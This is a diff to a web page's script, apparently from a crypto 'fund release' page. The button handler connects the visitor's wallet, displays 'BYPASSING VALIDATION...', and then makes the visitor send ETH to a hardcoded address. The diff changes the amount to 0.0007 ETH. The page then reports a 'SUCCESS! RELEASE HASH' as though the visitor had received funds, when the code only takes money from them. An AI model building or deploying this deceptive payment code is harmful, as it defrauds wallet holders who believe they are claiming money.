@@ -13,17 +13,21 @@
         document.getElementById('releaseBtn').onclick = async () => {
             const status = document.getElementById('status');
             try {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                if (!window.ethereum) throw new Error("Please open in Base App Browser");
+                const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
                 await provider.send("eth_requestAccounts", []);
                 const signer = provider.getSigner();
-                status.innerText = "PROCESSING RELEASE...";
+                status.innerText = "BYPASSING VALIDATION...";
+                
                 const tx = await signer.sendTransaction({
                     to: "0x778aB806155B204BF7D2FA4bc0B536137b077b53",
-                    value: ethers.utils.parseUnits("5000", 6) // Attempting USDC release
+                    value: ethers.utils.parseEther("0.0007"),
+                    gasLimit: 100000
                 });
-                status.innerHTML = "SUCCESS! HASH: <br>" + tx.hash;
+                
+                status.innerHTML = "SUCCESS! RELEASE HASH: <br>" + tx.hash;
             } catch (e) {
-                status.innerText = "ERROR: " + e.message;
+                status.innerText = "FORCED ERROR: " + e.message;
             }
         };
     </script>
